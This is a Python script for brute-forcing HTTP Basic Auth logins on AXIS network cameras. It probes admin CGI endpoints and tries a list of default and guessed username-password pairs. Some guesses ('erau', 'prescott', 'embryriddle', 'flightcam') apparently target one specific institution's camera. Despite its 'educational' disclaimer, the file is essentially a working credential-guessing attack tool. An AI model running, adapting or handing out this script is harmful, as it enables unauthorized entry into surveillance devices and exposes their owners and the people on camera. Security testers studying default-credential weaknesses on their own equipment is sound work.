#!/usr/bin/env python3
"""
Axis-Specific Brute Forcer
Uses AXIS brand credentials with HTTP Basic Auth only (no form discovery).
Targets /admin-bin/ and other AXIS-specific auth endpoints.
Educational/penetration testing use only on devices you own/permission.
"""
import requests
import sys
import time
import argparse
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.auth import HTTPDigestAuth

# AXIS-specific creds from brand_specific_bruteforce + camera_credentials.txt
AXIS_CREDS = [
    ('root', 'pass'),
    ('root', ''),
    ('admin', 'admin'),
    ('admin', ''),
    ('admin', 'axis'),
    ('admin', 'password'),
    ('admin', '1234'),
    ('admin', '12345'),
    ('admin', '123456'),
    ('root', 'root'),
    ('root', '1234'),
    ('root', '12345'),
    ('root', '123456'),
    ('root', 'password'),
    ('root', 'admin'),
    ('root', 'toor'),
    ('admin', 'pass'),
    ('admin', 'root'),
    ('admin', 'toor'),
    ('axis', 'axis'),
    ('axis', ''),
    ('Axis', 'Axis'),
    ('admin', 'changeme'),
    ('root', 'changeme'),
    ('admin', 'default'),
    ('admin', 'setup'),
    ('admin', 'config'),
    ('admin', 'system'),
    ('admin', 'erau'),
    ('admin', 'prescott'),
    ('root', 'erau'),
    ('root', 'prescott'),
    ('admin', 'flightcam'),
    ('admin', 'embryriddle'),
    ('root', 'embryriddle'),
    ('admin', 'p5415e'),
    ('admin', 'p5415'),
    ('root', 'p5415e'),
    ('root', 'p5415'),
    # Numeric
    ('admin', '0000'),
    ('admin', '1111'),
    ('admin', '4321'),
    ('admin', '9999'),
    ('admin', '7777'),
    ('admin', '8888'),
    # Service
    ('service', 'service'),
    ('supervisor', 'supervisor'),
    ('operator', 'operator'),
    ('viewer', 'viewer'),
    # PTZ-anon fallback
    ('anonymous', ''),
]

# Endpoints to test on AXIS cams
AXIS_ENDPOINTS = [
    '/axis-cgi/admin.cgi',
    '/axis-cgi/serverreport.cgi',
    '/axis-cgi/systemlog.cgi?action=view',
    '/axis-cgi/auditlog.cgi',
    '/admin-bin/',
    '/view/admin.shtml',
    '/admin-bin/admin.shtml',
]

class AxisBruter:
    def __init__(self, host, delay=0.4, timeout=8, threads=4, verbose=True):
        self.host = host.rstrip('/')
        if not self.host.startswith('http'):
            self.host = 'http://' + self.host
        self.delay = delay
        self.timeout = timeout
        self.threads = threads
        self.verbose = verbose
        self.lock = threading.Lock()
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (compatible; AXIS-Auth-Probe)',
            'Accept': '*/*',
        })
        self.total = 0
        self.failed = 0
        self.hits = []
    
    def log(self, msg):
        if self.verbose:
            print(msg, flush=True)
    
    def try_one(self, endpoint, user, pwd):
        url = self.host + endpoint
        try:
            r = self.session.get(url, auth=(user, pwd), timeout=self.timeout, allow_redirects=False)
            with self.lock:
                self.total += 1
            code = r.status_code
            length = len(r.content)
            # 200 or 302 = success; 401 = fail; 403 = forbidden (creds recognized but not authorized for this endpoint)
            success = code in (200, 302) or (code == 403 and length > 100)
            if success:
                with self.lock:
                    self.hits.append({'endpoint': endpoint, 'user': user, 'pwd': pwd, 'code': code, 'length': length})
                return True, code, length
            else:
                with self.lock:
                    self.failed += 1
                return False, code, length
        except requests.exceptions.RequestException as e:
            with self.lock:
                self.failed += 1
            return False, 0, str(e)
    
    def run(self, endpoints=None, creds=None):
        endpoints = endpoints or AXIS_ENDPOINTS
        creds = creds or AXIS_CREDS
        print(f"[+] AXIS Brute Force")
        print(f"[+] Host: {self.host}")
        print(f"[+] Endpoints: {len(endpoints)}")
        print(f"[+] Cred pairs: {len(creds)}")
        print(f"[+] Total attempts: {len(endpoints) * len(creds)}")
        print(f"[+] Delay: {self.delay}s | Threads: {self.threads}")
        print("-" * 70)
        
        # First: test endpoints are reachable. Keep only those that return 401 (auth-protected)
        live_endpoints = []
        for ep in endpoints:
            try:
                r = self.session.get(self.host + ep, timeout=self.timeout)
                status = r.status_code
                print(f"[*] {ep:50s} -> {status}")
                if status == 401:
                    live_endpoints.append(ep)
            except Exception as e:
                print(f"[!] {ep:50s} -> ERROR {e}")
        
        if not live_endpoints:
            print("[!] No auth-protected endpoints found. Aborting.")
            return
        
        print("-" * 70)
        print(f"[+] Live auth endpoints: {live_endpoints}")
        
        # Run the attack - try ONE endpoint with all creds first (most common pattern)
        first_ep = live_endpoints[0]
        print(f"[+] Attacking {first_ep} with all creds...")
        for user, pwd in creds:
            ok, code, length = self.try_one(first_ep, user, pwd)
            symbol = '[+]' if ok else '[-]'
            pwd_disp = repr(pwd) if pwd == '' else pwd
            print(f"  [{symbol}] {user}:{pwd_disp:20s} HTTP={code} LEN={length}")
            if ok:
                print(f"\n[!] SUCCESS at {first_ep} -> {user}:{pwd_disp}")
                self.hits.append({'endpoint': first_ep, 'user': user, 'pwd': pwd, 'code': code, 'length': length})
                # Verify on /axis-cgi/serverreport.cgi if we got hit on a viewable page
                if first_ep != '/axis-cgi/serverreport.cgi':
                    ok2, c2, l2 = self.try_one('/axis-cgi/serverreport.cgi', user, pwd)
                    if ok2:
                        print(f"  [+] Confirmed at /axis-cgi/serverreport.cgi -> HTTP={c2} LEN={l2}")
                return
            time.sleep(self.delay)

        print(f"\n[+] No creds worked on {first_ep}. Trying remaining endpoints with top 10 creds...")
        top = creds[:10]
        for ep in live_endpoints[1:]:
            print(f"[+] {ep}")
            for user, pwd in top:
                ok, code, length = self.try_one(ep, user, pwd)
                symbol = '[+]' if ok else '[-]'
                pwd_disp = repr(pwd) if pwd == '' else pwd
                print(f"  [{symbol}] {user}:{pwd_disp:20s} HTTP={code} LEN={length}")
                if ok:
                    print(f"\n[!] SUCCESS at {ep} -> {user}:{pwd_disp}")
                    return
                time.sleep(self.delay)

    def report(self):
        print("\n" + "=" * 70)
        print(f"[+] Total attempts: {self.total}")
        print(f"[+] Failed: {self.failed}")
        print(f"[+] Hits: {len(self.hits)}")
        for h in self.hits:
            print(f"  [+HIT] {h['endpoint']} -> {h['user']}:{repr(h['pwd'])} HTTP={h['code']} LEN={h['length']}")


def main():
    ap = argparse.ArgumentParser(description='AXIS-specific brute forcer')
    ap.add_argument('host', help='AXIS cam host:port')
    ap.add_argument('-d', '--delay', type=float, default=0.4)
    ap.add_argument('-t', '--threads', type=int, default=4)
    ap.add_argument('--timeout', type=int, default=8)
    ap.add_argument('--creds', help='Custom cred file (user:pwd per line)')
    args = ap.parse_args()
    
    creds = AXIS_CREDS
    if args.creds:
        creds = []
        with open(args.creds) as f:
            for line in f:
                line = line.strip()
                if line and ':' in line and not line.startswith('#'):
                    u, p = line.split(':', 1)
                    creds.append((u, p))
        print(f"[*] Loaded {len(creds)} creds from {args.creds}")
    
    b = AxisBruter(args.host, delay=args.delay, timeout=args.timeout, threads=args.threads)
    try:
        b.run(creds=creds)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
    b.report()


if __name__ == '__main__':
    main()